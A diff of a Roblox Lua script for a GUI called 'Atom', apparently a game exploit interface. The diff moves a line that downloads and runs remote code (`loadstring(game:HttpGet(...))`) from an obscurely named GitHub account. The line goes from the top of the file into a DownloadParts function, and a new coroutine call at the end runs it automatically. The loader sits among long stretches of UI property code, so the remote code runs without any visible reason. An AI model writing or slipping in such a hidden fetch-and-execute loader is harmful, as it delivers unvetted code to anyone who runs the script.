@@ -118,8 +118,6 @@ local TextLabel_28 = Instance.new("TextLabel")
 local NOAFK = Instance.new("Frame")
 local TextLabel_29 = Instance.new("TextLabel")
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
-
 --Properties:
 
 Atom.Name = "Atom"
@@ -1230,6 +1228,10 @@ TextLabel_29.TextScaled = true
 TextLabel_29.TextSize = 14.000
 TextLabel_29.TextWrapped = true
 
+function DownloadParts()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
+end
+
 -- Scripts:
 
 local function ZJOUJZ_fake_script() -- Avatar.Picture 
@@ -1824,3 +1826,4 @@ local function CWFA_fake_script() -- Background_3.LocalScript
 end
 coroutine.wrap(CWFA_fake_script)()
 coroutine.wrap(HKRXJGT_fake_script)()
+coroutine.wrap(DownloadParts)()
